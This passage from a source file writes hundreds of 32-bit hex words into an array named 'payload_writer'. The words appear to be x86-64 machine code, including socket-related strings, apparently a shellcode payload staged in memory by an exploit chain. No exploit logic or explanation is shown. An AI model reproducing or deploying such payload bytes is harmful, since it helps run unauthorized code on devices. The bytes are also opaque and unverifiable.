  payload_writer[573] = 0x8d480000;
  payload_writer[574] = 0x0041aa35;
  payload_writer[575] = 0x89c38900;
  payload_writer[576] = 0x02bfe8c7;
  payload_writer[577] = 0x8d480000;
  payload_writer[578] = 0x00496b15;
  payload_writer[579] = 0x358d4800;
  payload_writer[580] = 0x000041ac;
  payload_writer[581] = 0xaae8df89;
  payload_writer[582] = 0x48000002;
  payload_writer[583] = 0x495e158d;
  payload_writer[584] = 0x8d480000;
  payload_writer[585] = 0x0041b835;
  payload_writer[586] = 0xe8df8900;
  payload_writer[587] = 0x00000295;
  payload_writer[588] = 0x15ffff31;
  payload_writer[589] = 0x00004918;
  payload_writer[590] = 0x1375c085;
  payload_writer[591] = 0xffe78948;
  payload_writer[592] = 0x00493315;
  payload_writer[593] = 0x75c08500;
  payload_writer[594] = 0x3115ff06;
  payload_writer[595] = 0x48000049;
  payload_writer[596] = 0x4824048b;
  payload_writer[597] = 0x0824548b;
  payload_writer[598] = 0x10c48348;
  payload_writer[599] = 0x4553c35b;
  payload_writer[600] = 0x8348c931;
  payload_writer[601] = 0x314510ec;
  payload_writer[602] = 0x31c931c0;
  payload_writer[603] = 0x48f631d2;
  payload_writer[604] = 0x41073d8d;
  payload_writer[605] = 0x15ff0000;
  payload_writer[606] = 0x00004864;
  payload_writer[607] = 0xcd158d48;
  payload_writer[608] = 0x48000048;
  payload_writer[609] = 0x411d358d;
  payload_writer[610] = 0xc3890000;
  payload_writer[611] = 0x32e8c789;
  payload_writer[612] = 0x48000002;
  payload_writer[613] = 0x48de158d;
  payload_writer[614] = 0x8d480000;
  payload_writer[615] = 0x00411f35;
  payload_writer[616] = 0xe8df8900;
  payload_writer[617] = 0x0000021d;
  payload_writer[618] = 0xd1158d48;
  payload_writer[619] = 0x48000048;
  payload_writer[620] = 0x412b358d;
  payload_writer[621] = 0xdf890000;
  payload_writer[622] = 0x000208e8;
  payload_writer[623] = 0xffff3100;
  payload_writer[624] = 0x00488b15;
  payload_writer[625] = 0x74c08500;
  payload_writer[626] = 0xffc88305;
  payload_writer[627] = 0x89481eeb;
  payload_writer[628] = 0xa115ffe7;
  payload_writer[629] = 0x85000048;
  payload_writer[630] = 0x83ee75c0;
  payload_writer[631] = 0x74ff243c;
  payload_writer[632] = 0xffc031e8;
  payload_writer[633] = 0x00489715;
  payload_writer[634] = 0x24048b00;
  payload_writer[635] = 0x10c48348;
  payload_writer[636] = 0x5441c35b;
  payload_writer[637] = 0x89415355;
  payload_writer[638] = 0xec8348fc;
  payload_writer[639] = 0x0010bf20;
  payload_writer[640] = 0x15ff0000;
  payload_writer[641] = 0x000049e8;
  payload_writer[642] = 0x45c93145;
  payload_writer[643] = 0xc931c031;
  payload_writer[644] = 0xf631d231;
  payload_writer[645] = 0x623d8d48;
  payload_writer[646] = 0x48000040;
  payload_writer[647] = 0x15ffc389;
  payload_writer[648] = 0x000047bc;
  payload_writer[649] = 0x25158d48;
  payload_writer[650] = 0x48000048;
  payload_writer[651] = 0x4075358d;
  payload_writer[652] = 0xc5890000;
  payload_writer[653] = 0x8ae8c789;
  payload_writer[654] = 0x48000001;
  payload_writer[655] = 0x482e158d;
  payload_writer[656] = 0x8d480000;
  payload_writer[657] = 0x0040b035;
  payload_writer[658] = 0xe8ef8900;
  payload_writer[659] = 0x00000175;
  payload_writer[660] = 0x29158d48;
  payload_writer[661] = 0x48000048;
  payload_writer[662] = 0x4083358d;
  payload_writer[663] = 0xef890000;
  payload_writer[664] = 0x000160e8;
  payload_writer[665] = 0xffff3100;
  payload_writer[666] = 0x0047e315;
  payload_writer[667] = 0x75c08500;
  payload_writer[668] = 0x6c8d4830;
  payload_writer[669] = 0x11ba0f24;
  payload_writer[670] = 0x48000000;
  payload_writer[671] = 0x8944ee89;
  payload_writer[672] = 0xe915ffe7;
  payload_writer[673] = 0x85000047;
  payload_writer[674] = 0x481675c0;
  payload_writer[675] = 0x8948ee89;
  payload_writer[676] = 0x2115ffdf;
  payload_writer[677] = 0x31000049;
  payload_writer[678] = 0xe115ffc0;
  payload_writer[679] = 0xeb000047;
  payload_writer[680] = 0x48db3102;
  payload_writer[681] = 0x4820c483;
  payload_writer[682] = 0x5d5bd889;
  payload_writer[683] = 0x53c35c41;
  payload_writer[684] = 0x48c93145;
  payload_writer[685] = 0x4510ec83;
  payload_writer[686] = 0xc931c031;
  payload_writer[687] = 0xf631d231;
  payload_writer[688] = 0xb63d8d48;
  payload_writer[689] = 0xff00003f;
  payload_writer[690] = 0x00471315;
  payload_writer[691] = 0x158d4800;
  payload_writer[692] = 0x0000478c;
  payload_writer[693] = 0x38358d48;
  payload_writer[694] = 0x89000040;
  payload_writer[695] = 0xe8c789c3;
  payload_writer[696] = 0x000000e1;
  payload_writer[697] = 0x65158d48;
  payload_writer[698] = 0x48000047;
  payload_writer[699] = 0x3fb5358d;
  payload_writer[700] = 0xdf890000;
  payload_writer[701] = 0x0000cce8;
  payload_writer[702] = 0x158d4800;
  payload_writer[703] = 0x00004780;
  payload_writer[704] = 0xda358d48;
  payload_writer[705] = 0x8900003f;
  payload_writer[706] = 0x00b7e8df;
  payload_writer[707] = 0xff310000;
  payload_writer[708] = 0x473a15ff;
  payload_writer[709] = 0xc0850000;
  payload_writer[710] = 0x8d481975;
  payload_writer[711] = 0xff0c247c;
  payload_writer[712] = 0x00473b15;
  payload_writer[713] = 0x75c08500;
  payload_writer[714] = 0x5115ff0a;
  payload_writer[715] = 0x8b000047;
  payload_writer[716] = 0x480c2444;
  payload_writer[717] = 0x5b10c483;
  payload_writer[718] = 0x8d4853c3;
  payload_writer[719] = 0x003c4235;
  payload_writer[720] = 0x021cbf00;
  payload_writer[721] = 0xc0310000;
  payload_writer[722] = 0x000b74e8;
  payload_writer[723] = 0x4000ba00;
  payload_writer[724] = 0xc9310000;
  payload_writer[725] = 0x89c38948;
  payload_writer[726] = 0x0222bfc6;
  payload_writer[727] = 0xc0310000;
  payload_writer[728] = 0x000b5ce8;
  payload_writer[729] = 0xbfde8900;
  payload_writer[730] = 0x0000021d;
  payload_writer[731] = 0x4ee8c031;
  payload_writer[732] = 0x5b00000b;
  payload_writer[733] = 0x00001eba;
  payload_writer[734] = 0x0001be00;
  payload_writer[735] = 0x25bf0000;
  payload_writer[736] = 0x31000000;
  payload_writer[737] = 0x0b37e9c0;
  payload_writer[738] = 0x83480000;
  payload_writer[739] = 0x314508ec;
  payload_writer[740] = 0xc03145c9;
  payload_writer[741] = 0xd231c931;
  payload_writer[742] = 0x8d48f631;
  payload_writer[743] = 0x003f8f3d;
  payload_writer[744] = 0x3915ff00;
  payload_writer[745] = 0x48000046;
  payload_writer[746] = 0x46da158d;
  payload_writer[747] = 0x8d480000;
  payload_writer[748] = 0x003f9d35;
  payload_writer[749] = 0xe8c78900;
  payload_writer[750] = 0x00000009;
  payload_writer[751] = 0xffc0315a;
  payload_writer[752] = 0x0046c325;
  payload_writer[753] = 0xc0c74800;
  payload_writer[754] = 0x0000024f;
  payload_writer[755] = 0x000af3e9;
  payload_writer[756] = 0xc0c74800;
  payload_writer[757] = 0x00000250;
  payload_writer[758] = 0x000ae7e9;
  payload_writer[759] = 0xec834800;
  payload_writer[760] = 0x06c74808;
  payload_writer[761] = 0x00000160;
  payload_writer[762] = 0x31f28948;
  payload_writer[763] = 0xbffe89c0;
  payload_writer[764] = 0x00000251;
  payload_writer[765] = 0x000ac8e8;
  payload_writer[766] = 0x48c35a00;
  payload_writer[767] = 0x4808ec83;
  payload_writer[768] = 0xd231f189;
  payload_writer[769] = 0x45fe8948;
  payload_writer[770] = 0x52bfc031;
  payload_writer[771] = 0x31000002;
  payload_writer[772] = 0x0aabe8c0;
  payload_writer[773] = 0xc35a0000;
  payload_writer[774] = 0x08ec8348;
  payload_writer[775] = 0xd231fe89;
  payload_writer[776] = 0x53bfc931;
  payload_writer[777] = 0x31000002;
  payload_writer[778] = 0x0a93e8c0;
  payload_writer[779] = 0xc35a0000;
  payload_writer[780] = 0x08ec8348;
  payload_writer[781] = 0xf631d231;
  payload_writer[782] = 0x233d8d48;
  payload_writer[783] = 0x4500003f;
  payload_writer[784] = 0x3145c931;
  payload_writer[785] = 0xffc931c0;
  payload_writer[786] = 0x00459315;
  payload_writer[787] = 0x158d4800;
  payload_writer[788] = 0x0000463c;
  payload_writer[789] = 0x1c358d48;
  payload_writer[790] = 0x8900003f;
  payload_writer[791] = 0x62e958c7;
  payload_writer[792] = 0x48ffffff;
  payload_writer[793] = 0x01ddc0c7;
  payload_writer[794] = 0x55e90000;
  payload_writer[795] = 0x4800000a;
  payload_writer[796] = 0x0049c0c7;
  payload_writer[797] = 0x49e90000;
  payload_writer[798] = 0x4800000a;
  payload_writer[799] = 0x004ac0c7;
  payload_writer[800] = 0x3de90000;
  payload_writer[801] = 0x4800000a;
  payload_writer[802] = 0x0041c0c7;
  payload_writer[803] = 0x31e90000;
  payload_writer[804] = 0x4800000a;
  payload_writer[805] = 0x00cbc0c7;
  payload_writer[806] = 0x25e90000;
  payload_writer[807] = 0x4800000a;
  payload_writer[808] = 0x00ccc0c7;
  payload_writer[809] = 0x19e90000;
  payload_writer[810] = 0x4800000a;
  payload_writer[811] = 0x0223c0c7;
  payload_writer[812] = 0x0de90000;
  payload_writer[813] = 0x4800000a;
  payload_writer[814] = 0x023cc0c7;
  payload_writer[815] = 0x01e90000;
  payload_writer[816] = 0x5300000a;
  payload_writer[817] = 0x45c93145;
  payload_writer[818] = 0xc931c031;
  payload_writer[819] = 0xf631d231;
  payload_writer[820] = 0xb73d8d48;
  payload_writer[821] = 0xff00003e;
  payload_writer[822] = 0x00450315;
  payload_writer[823] = 0x158d4800;
  payload_writer[824] = 0x000045dc;
  payload_writer[825] = 0xb2358d48;
  payload_writer[826] = 0x8900003e;
  payload_writer[827] = 0xe8c789c3;
  payload_writer[828] = 0xfffffed1;
  payload_writer[829] = 0x8d48df89;
  payload_writer[830] = 0x0045fb15;
  payload_writer[831] = 0x358d4800;
  payload_writer[832] = 0x00003ea6;
  payload_writer[833] = 0xfffebce8;
  payload_writer[834] = 0x48df89ff;
  payload_writer[835] = 0x45fe158d;
  payload_writer[836] = 0x8d480000;
  payload_writer[837] = 0x003ea335;
  payload_writer[838] = 0xfea7e800;
  payload_writer[839] = 0xdf89ffff;
  payload_writer[840] = 0xb9158d48;
  payload_writer[841] = 0x48000045;
  payload_writer[842] = 0x3e9c358d;
  payload_writer[843] = 0x92e80000;
  payload_writer[844] = 0x89fffffe;
  payload_writer[845] = 0x158d48df;
  payload_writer[846] = 0x000045cc;
  payload_writer[847] = 0x92358d48;
  payload_writer[848] = 0xe800003e;
  payload_writer[849] = 0xfffffe7d;
  payload_writer[850] = 0x8d48df89;
  payload_writer[851] = 0x0045d715;
  payload_writer[852] = 0x358d4800;
  payload_writer[853] = 0x00003e88;
  payload_writer[854] = 0xfffe68e8;
  payload_writer[855] = 0x48df89ff;
  payload_writer[856] = 0x45da158d;
  payload_writer[857] = 0x8d480000;
  payload_writer[858] = 0x003e8035;
  payload_writer[859] = 0xfe53e800;
  payload_writer[860] = 0xdf89ffff;
  payload_writer[861] = 0x85158d48;
  payload_writer[862] = 0x48000045;
  payload_writer[863] = 0x3e78358d;
  payload_writer[864] = 0x3ee80000;
  payload_writer[865] = 0x89fffffe;
  payload_writer[866] = 0x158d48df;
  payload_writer[867] = 0x000045b8;
  payload_writer[868] = 0x6e358d48;
  payload_writer[869] = 0xe800003e;
  payload_writer[870] = 0xfffffe29;
  payload_writer[871] = 0x8d48df89;
  payload_writer[872] = 0x00452b15;
  payload_writer[873] = 0x358d4800;
  payload_writer[874] = 0x00003e6b;
  payload_writer[875] = 0xfffe14e8;
  payload_writer[876] = 0x48df89ff;
  payload_writer[877] = 0x457e158d;
  payload_writer[878] = 0x8d480000;
  payload_writer[879] = 0x003e6835;
  payload_writer[880] = 0xfdffe800;
  payload_writer[881] = 0xdf89ffff;
  payload_writer[882] = 0x21158d48;
  payload_writer[883] = 0x48000045;
  payload_writer[884] = 0x3e64358d;
  payload_writer[885] = 0xeae80000;
  payload_writer[886] = 0x89fffffd;
  payload_writer[887] = 0x158d48df;
  payload_writer[888] = 0x000044d4;
  payload_writer[889] = 0x60358d48;
  payload_writer[890] = 0xe800003e;
  payload_writer[891] = 0xfffffdd5;
  payload_writer[892] = 0x8d48df89;
  payload_writer[893] = 0x0044cf15;
  payload_writer[894] = 0x358d4800;
  payload_writer[895] = 0x00003e5a;
  payload_writer[896] = 0xfffdc0e8;
  payload_writer[897] = 0x48df89ff;
  payload_writer[898] = 0x4492158d;
  payload_writer[899] = 0x8d480000;
  payload_writer[900] = 0x003e5435;
  payload_writer[901] = 0xfdabe800;
  payload_writer[902] = 0xdf89ffff;
  payload_writer[903] = 0xc5158d48;
  payload_writer[904] = 0x48000044;
  payload_writer[905] = 0x3e4c358d;
  payload_writer[906] = 0x96e80000;
  payload_writer[907] = 0x89fffffd;
  payload_writer[908] = 0x158d48df;
  payload_writer[909] = 0x000044a0;
  payload_writer[910] = 0x43358d48;
  payload_writer[911] = 0xe800003e;
  payload_writer[912] = 0xfffffd81;
  payload_writer[913] = 0x8d48df89;
  payload_writer[914] = 0x00445b15;
  payload_writer[915] = 0x358d4800;
  payload_writer[916] = 0x00003e3a;
  payload_writer[917] = 0xfffd6ce8;
  payload_writer[918] = 0x48df89ff;
  payload_writer[919] = 0x44ce158d;
  payload_writer[920] = 0x8d480000;
  payload_writer[921] = 0x003e3235;
  payload_writer[922] = 0xfd57e800;
  payload_writer[923] = 0xdf89ffff;
  payload_writer[924] = 0xa1158d48;
  payload_writer[925] = 0x48000044;
  payload_writer[926] = 0x3e29358d;
  payload_writer[927] = 0x42e80000;
  payload_writer[928] = 0x45fffffd;
  payload_writer[929] = 0x3145c931;
  payload_writer[930] = 0x31c931c0;
  payload_writer[931] = 0x48f631d2;
  payload_writer[932] = 0x3e1d3d8d;
  payload_writer[933] = 0x15ff0000;
  payload_writer[934] = 0x00004344;
  payload_writer[935] = 0xf5158d48;
  payload_writer[936] = 0x48000043;
  payload_writer[937] = 0x3e1b358d;
  payload_writer[938] = 0xc3890000;
  payload_writer[939] = 0x12e8c789;
  payload_writer[940] = 0x89fffffd;
  payload_writer[941] = 0x158d48df;
  payload_writer[942] = 0x00004464;
  payload_writer[943] = 0x10358d48;
  payload_writer[944] = 0xe800003e;
  payload_writer[945] = 0xfffffcfd;
  payload_writer[946] = 0x485bdf89;
  payload_writer[947] = 0x43de158d;
  payload_writer[948] = 0x8d480000;
  payload_writer[949] = 0x003e0835;
  payload_writer[950] = 0xfce7e900;
  payload_writer[951] = 0x5355ffff;
  payload_writer[952] = 0x28ec8348;
  payload_writer[953] = 0x8d48f389;
  payload_writer[954] = 0x48042454;
  payload_writer[955] = 0x02bffe89;
  payload_writer[956] = 0x48000000;
  payload_writer[957] = 0x10246c8d;
  payload_writer[958] = 0x43ca15ff;
  payload_writer[959] = 0x448b0000;
  payload_writer[960] = 0xc7660424;
  payload_writer[961] = 0x10102444;
  payload_writer[962] = 0xfbb70f02;
  payload_writer[963] = 0x14244489;
  payload_writer[964] = 0x43c215ff;
  payload_writer[965] = 0x8d480000;
  payload_writer[966] = 0xba1a247c;
  payload_writer[967] = 0x00000006;
  payload_writer[968] = 0x24448966;
  payload_writer[969] = 0xfff63112;
  payload_writer[970] = 0x0045bb15;
  payload_writer[971] = 0x70b84800;
  payload_writer[972] = 0x6b636f73;
  payload_writer[973] = 0x48007465;
  payload_writer[974] = 0x08247c8d;
  payload_writer[975] = 0x24448948;
  payload_writer[976] = 0xbac93108;
  payload_writer[977] = 0x00000001;
  payload_writer[978] = 0x000002be;
  payload_writer[979] = 0x6d15ff00;
  payload_writer[980] = 0x48000043;
  payload_writer[981] = 0x10baee89;
  payload_writer[982] = 0x89000000;
  payload_writer[983] = 0xffc789c3;
  payload_writer[984] = 0x0043ab15;
  payload_writer[985] = 0xc4834800;
  payload_writer[986] = 0x5bd88928;
  payload_writer[987] = 0x25ffc35d;
  payload_writer[988] = 0x00004384;
  payload_writer[989] = 0x31d26348;
  payload_writer[990] = 0x6125ffc9;
  payload_writer[991] = 0x41000043;
  payload_writer[992] = 0x41564157;
  payload_writer[993] = 0x55544155;
  payload_writer[994] = 0xec814853;
  payload_writer[995] = 0x00001008;
  payload_writer[996] = 0xbffe8941;
  payload_writer[997] = 0x00000001;
  payload_writer[998] = 0x15ffdb31;
  payload_writer[999] = 0x00004450;
  payload_writer[1000] = 0x48e58949;
  payload_writer[1001] = 0xc931c589;
  payload_writer[1002] = 0x001000ba;
  payload_writer[1003] = 0xee894c00;
  payload_writer[1004] = 0xfff78944;
  payload_writer[1005] = 0x00434715;
  payload_writer[1006] = 0x41c08500;
  payload_writer[1007] = 0x407ec489;
  payload_writer[1008] = 0x233c8d46;
  payload_writer[1009] = 0x49ef8948;
  payload_writer[1010] = 0xff48f763;
  payload_writer[1011] = 0xb515ffc6;
  payload_writer[1012] = 0x48000044;
  payload_writer[1013] = 0xc031c589;
  payload_writer[1014] = 0x41eb0148;
  payload_writer[1015] = 0x0005548a;
  payload_writer[1016] = 0x48031488;
  payload_writer[1017] = 0x3941c0ff;
  payload_writer[1018] = 0x49f07fc4;
  payload_writer[1019] = 0x00badf63;
  payload_writer[1020] = 0x31000010;
  payload_writer[1021] = 0xef894cf6;
  payload_writer[1022] = 0x44ea15ff;
  payload_writer[1023] = 0xa6eb0000;
  payload_writer[1024] = 0x08c48148;
  payload_writer[1025] = 0x48000010;
  payload_writer[1026] = 0x5d5be889;
  payload_writer[1027] = 0x5d415c41;
  payload_writer[1028] = 0x5f415e41;
  payload_writer[1029] = 0x555441c3;
  payload_writer[1030] = 0xfc894153;
  payload_writer[1031] = 0x00ec8148;
  payload_writer[1032] = 0x48000010;
  payload_writer[1033] = 0xffbaf789;
  payload_writer[1034] = 0xbe000001;
  payload_writer[1035] = 0x00000601;
  payload_writer[1036] = 0x0006d2e8;
  payload_writer[1037] = 0xe3894800;
  payload_writer[1038] = 0xc931c589;
  payload_writer[1039] = 0x001000ba;
  payload_writer[1040] = 0xde894800;
  payload_writer[1041] = 0xffe78944;
  payload_writer[1042] = 0x0042b315;
  payload_writer[1043] = 0x7ec08500;
  payload_writer[1044] = 0xde89481f;
  payload_writer[1045] = 0x6348ef89;
  payload_writer[1046] = 0x069de8d0;
  payload_writer[1047] = 0x00ba0000;
  payload_writer[1048] = 0x31000010;
  payload_writer[1049] = 0xdf8948f6;
  payload_writer[1050] = 0x447a15ff;
  payload_writer[1051] = 0xcaeb0000;
  payload_writer[1052] = 0x9ce8ef89;
  payload_writer[1053] = 0x48000006;
  payload_writer[1054] = 0x1000c481;
  payload_writer[1055] = 0x5d5b0000;
  payload_writer[1056] = 0x48c35c41;
  payload_writer[1057] = 0x8b08ec83;
  payload_writer[1058] = 0x0040b33d;
  payload_writer[1059] = 0x158d4800;
  payload_writer[1060] = 0x00004314;
  payload_writer[1061] = 0x57358d48;
  payload_writer[1062] = 0xe800003c;
  payload_writer[1063] = 0xfffffb25;
  payload_writer[1064] = 0x409a3d8b;
  payload_writer[1065] = 0x8d480000;
  payload_writer[1066] = 0x0042cb15;
  payload_writer[1067] = 0x358d4800;
  payload_writer[1068] = 0x00003c4f;
  payload_writer[1069] = 0xfffb0ce8;
  payload_writer[1070] = 0x813d8bff;
  payload_writer[1071] = 0x48000040;
  payload_writer[1072] = 0x42a2158d;
  payload_writer[1073] = 0x8d480000;
  payload_writer[1074] = 0x003c4535;
  payload_writer[1075] = 0xfaf3e800;
  payload_writer[1076] = 0x3d8bffff;
  payload_writer[1077] = 0x00004068;
  payload_writer[1078] = 0xc1158d48;
  payload_writer[1079] = 0x48000042;
  payload_writer[1080] = 0x3c3d358d;
  payload_writer[1081] = 0xdae80000;
  payload_writer[1082] = 0x8bfffffa;
  payload_writer[1083] = 0x00404f3d;
  payload_writer[1084] = 0x158d4800;
  payload_writer[1085] = 0x00004288;
  payload_writer[1086] = 0x33358d48;
  payload_writer[1087] = 0xe800003c;
  payload_writer[1088] = 0xfffffac1;
  payload_writer[1089] = 0x40363d8b;
  payload_writer[1090] = 0x8d480000;
  payload_writer[1091] = 0x00425f15;
  payload_writer[1092] = 0x358d4800;
  payload_writer[1093] = 0x00003c2a;
  payload_writer[1094] = 0xfffaa8e8;
  payload_writer[1095] = 0x1d3d8bff;
  payload_writer[1096] = 0x48000040;
  payload_writer[1097] = 0x422e158d;
  payload_writer[1098] = 0x8d480000;
  payload_writer[1099] = 0x003c2035;
  payload_writer[1100] = 0xfa8fe800;
  payload_writer[1101] = 0x3d8bffff;
  payload_writer[1102] = 0x00004004;
  payload_writer[1103] = 0x45158d48;
  payload_writer[1104] = 0x48000042;
  payload_writer[1105] = 0x3c18358d;
  payload_writer[1106] = 0x76e80000;
  payload_writer[1107] = 0x8bfffffa;
  payload_writer[1108] = 0x003feb3d;
  payload_writer[1109] = 0x158d4800;
  payload_writer[1110] = 0x000041f4;
  payload_writer[1111] = 0x13358d48;
  payload_writer[1112] = 0xe800003c;
  payload_writer[1113] = 0xfffffa5d;
  payload_writer[1114] = 0x3fd23d8b;
  payload_writer[1115] = 0x8d480000;
  payload_writer[1116] = 0x00423b15;
  payload_writer[1117] = 0x358d4800;
  payload_writer[1118] = 0x00003c11;
  payload_writer[1119] = 0xfffa44e8;
  payload_writer[1120] = 0xb93d8bff;
  payload_writer[1121] = 0x4800003f;
  payload_writer[1122] = 0x41d2158d;
  payload_writer[1123] = 0x8d480000;
  payload_writer[1124] = 0x003c0c35;
  payload_writer[1125] = 0xfa2be800;
  payload_writer[1126] = 0x3d8bffff;
  payload_writer[1127] = 0x00003fa0;
  payload_writer[1128] = 0xf1158d48;
  payload_writer[1129] = 0x48000041;
  payload_writer[1130] = 0x3c0a358d;
  payload_writer[1131] = 0x12e80000;
  payload_writer[1132] = 0x8bfffffa;
  payload_writer[1133] = 0x003f873d;
  payload_writer[1134] = 0x158d4800;
  payload_writer[1135] = 0x000041d0;
  payload_writer[1136] = 0x358d4858;
  payload_writer[1137] = 0x00003c09;
  payload_writer[1138] = 0xfff9f8e9;
  payload_writer[1139] = 0x314553ff;
  payload_writer[1140] = 0xc03145c9;
  payload_writer[1141] = 0xd231c931;
  payload_writer[1142] = 0x8d48f631;
  payload_writer[1143] = 0x003c063d;
  payload_writer[1144] = 0xf915ff00;
  payload_writer[1145] = 0x4800003f;
  payload_writer[1146] = 0x4202158d;
  payload_writer[1147] = 0x8d480000;
  payload_writer[1148] = 0x003c0a35;
  payload_writer[1149] = 0x89c38900;
  payload_writer[1150] = 0xf9c7e8c7;
  payload_writer[1151] = 0xdf89ffff;
  payload_writer[1152] = 0x81158d48;
  payload_writer[1153] = 0x48000043;
  payload_writer[1154] = 0x3bf8358d;
  payload_writer[1155] = 0xb2e80000;
  payload_writer[1156] = 0x89fffff9;
  payload_writer[1157] = 0x158d48df;
  payload_writer[1158] = 0x000041fc;
  payload_writer[1159] = 0xe8358d48;
  payload_writer[1160] = 0xe800003b;
  payload_writer[1161] = 0xfffff99d;
  payload_writer[1162] = 0x8d48df89;
  payload_writer[1163] = 0x00425715;
  payload_writer[1164] = 0x358d4800;
  payload_writer[1165] = 0x00003bda;
  payload_writer[1166] = 0xfff988e8;
  payload_writer[1167] = 0x48df89ff;
  payload_writer[1168] = 0x42e2158d;
  payload_writer[1169] = 0x8d480000;
  payload_writer[1170] = 0x003bcd35;
  payload_writer[1171] = 0xf973e800;
  payload_writer[1172] = 0xdf89ffff;
  payload_writer[1173] = 0x8d158d48;
  payload_writer[1174] = 0x48000042;
  payload_writer[1175] = 0x3bc1358d;
  payload_writer[1176] = 0x5ee80000;
  payload_writer[1177] = 0x89fffff9;
  payload_writer[1178] = 0x158d48df;
  payload_writer[1179] = 0x00004168;
  payload_writer[1180] = 0xb3358d48;
  payload_writer[1181] = 0xe800003b;
  payload_writer[1182] = 0xfffff949;
  payload_writer[1183] = 0x8d48df89;
  payload_writer[1184] = 0x00421315;
  payload_writer[1185] = 0x358d4800;
  payload_writer[1186] = 0x00003ba5;
  payload_writer[1187] = 0xfff934e8;
  payload_writer[1188] = 0x48df89ff;
  payload_writer[1189] = 0x411e158d;
  payload_writer[1190] = 0x8d480000;
  payload_writer[1191] = 0x003b9735;
  payload_writer[1192] = 0xf91fe800;
  payload_writer[1193] = 0xdf89ffff;
  payload_writer[1194] = 0xd1158d48;
  payload_writer[1195] = 0x48000041;
  payload_writer[1196] = 0x3b89358d;
  payload_writer[1197] = 0x0ae80000;
  payload_writer[1198] = 0x89fffff9;
  payload_writer[1199] = 0x158d48df;
  payload_writer[1200] = 0x0000417c;
  payload_writer[1201] = 0x7c358d48;
  payload_writer[1202] = 0xe800003b;
  payload_writer[1203] = 0xfffff8f5;
  payload_writer[1204] = 0x8d48df89;
  payload_writer[1205] = 0x0041cf15;
  payload_writer[1206] = 0x358d4800;
  payload_writer[1207] = 0x00003b6e;
  payload_writer[1208] = 0xfff8e0e8;
  payload_writer[1209] = 0x48df89ff;
  payload_writer[1210] = 0x427a158d;
  payload_writer[1211] = 0x8d480000;
  payload_writer[1212] = 0x003b6135;
  payload_writer[1213] = 0xf8cbe800;
  payload_writer[1214] = 0xdf89ffff;
  payload_writer[1215] = 0x15158d48;
  payload_writer[1216] = 0x48000042;
  payload_writer[1217] = 0x3b53358d;
  payload_writer[1218] = 0xb6e80000;
  payload_writer[1219] = 0x89fffff8;
  payload_writer[1220] = 0x158d48df;
  payload_writer[1221] = 0x00004160;
  payload_writer[1222] = 0x45358d48;
  payload_writer[1223] = 0xe800003b;
  payload_writer[1224] = 0xfffff8a1;
  payload_writer[1225] = 0x8d48df89;
  payload_writer[1226] = 0x00420315;
  payload_writer[1227] = 0x358d4800;
  payload_writer[1228] = 0x00003b38;
  payload_writer[1229] = 0xfff88ce8;
  payload_writer[1230] = 0x48df89ff;
  payload_writer[1231] = 0x408e158d;
  payload_writer[1232] = 0x8d480000;
  payload_writer[1233] = 0x003b2b35;
  payload_writer[1234] = 0xf877e800;
  payload_writer[1235] = 0xdf89ffff;
  payload_writer[1236] = 0x49158d48;
  payload_writer[1237] = 0x48000041;
  payload_writer[1238] = 0x3b1f358d;
  payload_writer[1239] = 0x62e80000;
  payload_writer[1240] = 0x89fffff8;
  payload_writer[1241] = 0x158d48df;
  payload_writer[1242] = 0x00004204;
  payload_writer[1243] = 0x11358d48;
  payload_writer[1244] = 0xe800003b;
  payload_writer[1245] = 0xfffff84d;
  payload_writer[1246] = 0x8d48df89;
  payload_writer[1247] = 0x00408f15;
  payload_writer[1248] = 0x358d4800;
  payload_writer[1249] = 0x00003b03;
  payload_writer[1250] = 0xfff838e8;
  payload_writer[1251] = 0x48df89ff;
  payload_writer[1252] = 0x40c2158d;
  payload_writer[1253] = 0x8d480000;
  payload_writer[1254] = 0x003af635;
  payload_writer[1255] = 0xf823e800;
  payload_writer[1256] = 0xdf89ffff;
  payload_writer[1257] = 0x15158d48;
  payload_writer[1258] = 0x48000041;
  payload_writer[1259] = 0x3ae8358d;
  payload_writer[1260] = 0x0ee80000;
  payload_writer[1261] = 0x89fffff8;
  payload_writer[1262] = 0x158d48df;
  payload_writer[1263] = 0x00004108;
  payload_writer[1264] = 0xdb358d48;
  payload_writer[1265] = 0xe800003a;
  payload_writer[1266] = 0xfffff7f9;
  payload_writer[1267] = 0x8d48df89;
  payload_writer[1268] = 0x00404b15;
  payload_writer[1269] = 0x358d4800;
  payload_writer[1270] = 0x00003ac5;
  payload_writer[1271] = 0xfff7e4e8;
  payload_writer[1272] = 0x48df89ff;
  payload_writer[1273] = 0x415e158d;
  payload_writer[1274] = 0x8d480000;
  payload_writer[1275] = 0x003ab735;
  payload_writer[1276] = 0xf7cfe800;
  payload_writer[1277] = 0xdf89ffff;
  payload_writer[1278] = 0x59158d48;
  payload_writer[1279] = 0x48000041;
  payload_writer[1280] = 0x3aaa358d;
  payload_writer[1281] = 0xbae80000;
  payload_writer[1282] = 0x89fffff7;
  payload_writer[1283] = 0x158d48df;
  payload_writer[1284] = 0x0000405c;
  payload_writer[1285] = 0x9a358d48;
  payload_writer[1286] = 0xe800003a;
  payload_writer[1287] = 0xfffff7a5;
  payload_writer[1288] = 0x8d48df89;
  payload_writer[1289] = 0x003f9f15;
  payload_writer[1290] = 0x358d4800;
  payload_writer[1291] = 0x00003a8d;
  payload_writer[1292] = 0xfff790e8;
  payload_writer[1293] = 0x48df89ff;
  payload_writer[1294] = 0x3fea158d;
  payload_writer[1295] = 0x8d480000;
  payload_writer[1296] = 0x003a8135;
  payload_writer[1297] = 0xf77be800;
  payload_writer[1298] = 0xdf89ffff;
  payload_writer[1299] = 0x65158d48;
  payload_writer[1300] = 0x48000040;
  payload_writer[1301] = 0x3a77358d;
  payload_writer[1302] = 0x66e80000;
  payload_writer[1303] = 0x89fffff7;
  payload_writer[1304] = 0x158d48df;
  payload_writer[1305] = 0x00004028;
  payload_writer[1306] = 0x69358d48;
  payload_writer[1307] = 0xe800003a;
  payload_writer[1308] = 0xfffff751;
  payload_writer[1309] = 0x8d48df89;
  payload_writer[1310] = 0x00407b15;
  payload_writer[1311] = 0x358d4800;
  payload_writer[1312] = 0x00003a5a;
  payload_writer[1313] = 0xfff73ce8;
  payload_writer[1314] = 0x48df89ff;
  payload_writer[1315] = 0x3fce158d;
  payload_writer[1316] = 0x8d480000;
  payload_writer[1317] = 0x003a4635;
  payload_writer[1318] = 0xf727e800;
  payload_writer[1319] = 0xdf89ffff;
  payload_writer[1320] = 0x19158d48;
  payload_writer[1321] = 0x4800003f;
  payload_writer[1322] = 0x3a36358d;
  payload_writer[1323] = 0x12e80000;
  payload_writer[1324] = 0x89fffff7;
